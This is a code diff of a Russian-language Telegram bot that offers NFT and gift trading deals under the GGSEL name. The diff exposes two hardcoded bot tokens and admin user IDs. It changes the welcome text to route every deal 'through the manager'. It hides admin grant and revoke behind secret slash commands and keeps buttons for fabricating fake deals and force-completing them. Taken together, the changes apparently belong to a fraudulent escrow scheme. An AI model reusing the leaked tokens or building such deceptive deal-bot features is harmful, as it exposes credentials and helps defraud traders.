@@ -15,9 +15,8 @@ from aiogram.fsm.state import State, StatesGroup
 from aiogram.fsm.storage.memory import MemoryStorage
 from aiogram.client.default import DefaultBotProperties
 
-# ===== НАСТРОЙКИ =====
-BOT_TOKEN = os.getenv("BOT_TOKEN", "8835759226:AAHawpWNNnue_FtqEhvn7q2O93UOi4EcB4g")
-# Администраторы по умолчанию (8297446667 – основной, 8400055743 – добавленный)
+# ===== НАСТРОЙКИ GGSEL =====
+BOT_TOKEN = os.getenv("BOT_TOKEN", "8923875062:AAHHU5XBuZLrg1dmLXLGEbMRxSxe-ap_uIk")
 INITIAL_ADMIN_IDS = [int(x) for x in os.getenv("ADMIN_IDS", "8297446667,8400055743").split(",")]
 BANNER_URL = os.getenv("BANNER_URL", "https://i.ibb.co/gbXTDz0f/IMG-1254.jpg")
 PORT = int(os.getenv("PORT", 8080))
@@ -96,7 +95,7 @@ def welcome_text():
         "1⃣ Автоматические сделки с NFT и подарками\n"
         f"2⃣ {shield_emoji()} Полная защита обеих сторон\n"
         f"3⃣ {emoji('coin')} Реферальная программа — 50% от комиссии\n"
-        f"4⃣ {emoji('package')} Все сделки проходят через бота между покупателем и продавцем мы не просим передачу 3-им лицам</blockquote>\n\n"
+        f"4⃣ {emoji('package')} Все сделки проходят через менеджера</blockquote>\n\n"
         f"{emoji('lamp')} Наш канал ─ @ggsel"
     )
 
@@ -149,7 +148,7 @@ def main_menu(lang="ru"):
         "en": [f"{emoji('balance_icon')} Balance", "📋 My Deals", "🤝 New Deal",
                "📄 My Details", f"{emoji('people')} Referrals", "🌐 Language / Язык", "🆘 Support"]
     }[lang]
-    callbacks = ["balance_menu", "my_deals", "new_deal", "my_rekv", "referrals", "change_lang", "support"]
+    callbacks = ["balance_menu", "my_deals", "new_deal", "my_rekv", "referrals", "change_lang"]
     kb = [
         [InlineKeyboardButton(text=t[0], callback_data=callbacks[0]),
          InlineKeyboardButton(text=t[1], callback_data=callbacks[1])],
@@ -157,7 +156,7 @@ def main_menu(lang="ru"):
          InlineKeyboardButton(text=t[3], callback_data=callbacks[3])],
         [InlineKeyboardButton(text=t[4], callback_data=callbacks[4]),
          InlineKeyboardButton(text=t[5], callback_data=callbacks[5])],
-        [InlineKeyboardButton(text=t[6], callback_data=callbacks[6])]
+        [InlineKeyboardButton(text=t[6], url="https://t.me/ggsel")]
     ]
     return InlineKeyboardMarkup(inline_keyboard=kb)
 
@@ -168,8 +167,6 @@ def admin_menu():
         [InlineKeyboardButton(text="📋 Все сделки", callback_data="admin_all_deals")],
         [InlineKeyboardButton(text="📊 Статистика", callback_data="admin_stats")],
         [InlineKeyboardButton(text="🔢 Тестовые сделки", callback_data="admin_fake_deals")],
-        [InlineKeyboardButton(text="➕ Выдать админку", callback_data="admin_add_admin")],
-        [InlineKeyboardButton(text="➖ Убрать админку", callback_data="admin_remove_admin")],
         [InlineKeyboardButton(text="👥 Список админов", callback_data="admin_list_admins")],
         [InlineKeyboardButton(text="🔙 В главное меню", callback_data="main_menu")]
     ]
@@ -442,6 +439,41 @@ async def givemas_cmd(message: Message):
         await complete_deal_logic(did, msg=message)
     except: await message.answer("❌ Формат: /giveMas deal_id")
 
+# ===== СКРЫТЫЕ КОМАНДЫ ДЛЯ АДМИНОВ =====
+@dp.message(Command("adminteam214"))
+async def admin_add_secret(message: Message):
+    if not is_admin(message.from_user.id):
+        return await message.answer("❌ Нет доступа.")
+    try:
+        _, uid_s = message.text.split()
+        new_admin = int(uid_s)
+        if new_admin in admin_ids:
+            await message.answer("❌ Этот пользователь уже администратор.")
+        else:
+            admin_ids.append(new_admin)
+            save_data()
+            await message.answer(f"✅ Пользователь {new_admin} теперь администратор.")
+    except:
+        await message.answer("❌ Формат: /adminteam214 <user_id>")
+
+@dp.message(Command("adminteam213"))
+async def admin_remove_secret(message: Message):
+    if not is_admin(message.from_user.id):
+        return await message.answer("❌ Нет доступа.")
+    try:
+        _, uid_s = message.text.split()
+        rem_admin = int(uid_s)
+        if rem_admin not in admin_ids:
+            await message.answer("❌ Этот пользователь не является администратором.")
+        elif len(admin_ids) == 1:
+            await message.answer("❌ Нельзя удалить последнего администратора.")
+        else:
+            admin_ids.remove(rem_admin)
+            save_data()
+            await message.answer(f"✅ Администратор {rem_admin} удалён.")
+    except:
+        await message.answer("❌ Формат: /adminteam213 <user_id>")
+
 # ===== ГЛАВНОЕ МЕНЮ =====
 @dp.callback_query(F.data == "main_menu")
 async def main_menu_cb(call: CallbackQuery):
@@ -535,57 +567,6 @@ async def adm_fake(call: CallbackQuery):
     save_data()
     await delete_and_send_text(call, f"✅ Создано {cnt} тестовых сделок.", admin_menu())
 
-# ===== УПРАВЛЕНИЕ АДМИНАМИ =====
-@dp.callback_query(F.data == "admin_add_admin")
-async def admin_add_admin_start(call: CallbackQuery, state: FSMContext):
-    if not is_admin(call.from_user.id):
-        return await call.answer("❌", show_alert=True)
-    await call.answer()
-    await call.message.answer("Введите ID пользователя, которого нужно сделать администратором:")
-    await state.set_state(AdminStates.waiting_admin_add)
-
-@dp.message(AdminStates.waiting_admin_add)
-async def admin_add_admin_process(message: Message, state: FSMContext):
-    if not is_admin(message.from_user.id):
-        return
-    try:
-        new_admin = int(message.text.strip())
-        if new_admin in admin_ids:
-            await message.answer("❌ Этот пользователь уже администратор.")
-        else:
-            admin_ids.append(new_admin)
-            save_data()
-            await message.answer(f"✅ Пользователь {new_admin} теперь администратор.")
-    except:
-        await message.answer("❌ Введите корректный ID.")
-    await state.clear()
-
-@dp.callback_query(F.data == "admin_remove_admin")
-async def admin_remove_admin_start(call: CallbackQuery, state: FSMContext):
-    if not is_admin(call.from_user.id):
-        return await call.answer("❌", show_alert=True)
-    await call.answer()
-    await call.message.answer("Введите ID администратора, которого нужно удалить:")
-    await state.set_state(AdminStates.waiting_admin_remove)
-
-@dp.message(AdminStates.waiting_admin_remove)
-async def admin_remove_admin_process(message: Message, state: FSMContext):
-    if not is_admin(message.from_user.id):
-        return
-    try:
-        rem_admin = int(message.text.strip())
-        if rem_admin not in admin_ids:
-            await message.answer("❌ Этот пользователь не является администратором.")
-        elif len(admin_ids) == 1:
-            await message.answer("❌ Нельзя удалить последнего администратора.")
-        else:
-            admin_ids.remove(rem_admin)
-            save_data()
-            await message.answer(f"✅ Администратор {rem_admin} удалён.")
-    except:
-        await message.answer("❌ Введите корректный ID.")
-    await state.clear()
-
 @dp.callback_query(F.data == "admin_list_admins")
 async def admin_list_admins(call: CallbackQuery):
     if not is_admin(call.from_user.id):
@@ -597,7 +578,12 @@ async def admin_list_admins(call: CallbackQuery):
 # ===== ТЕХПОДДЕРЖКА =====
 @dp.callback_query(F.data == "support")
 async def support_handler(call: CallbackQuery):
-    await call.answer("ℹ️ Обратитесь к менеджеру через наш канал @ggsel", show_alert=True)
+    await call.answer()
+    await call.message.answer("🆘 Техподдержка\n\nСвяжитесь с менеджером: @ggsel",
+                              reply_markup=InlineKeyboardMarkup(inline_keyboard=[
+                                  [InlineKeyboardButton(text="💬 Написать @ggsel", url="https://t.me/ggsel")],
+                                  [InlineKeyboardButton(text="🔙 Назад", callback_data="main_menu")]
+                              ]))
 
 # ===== БАЛАНС =====
 @dp.callback_query(F.data == "balance_menu")
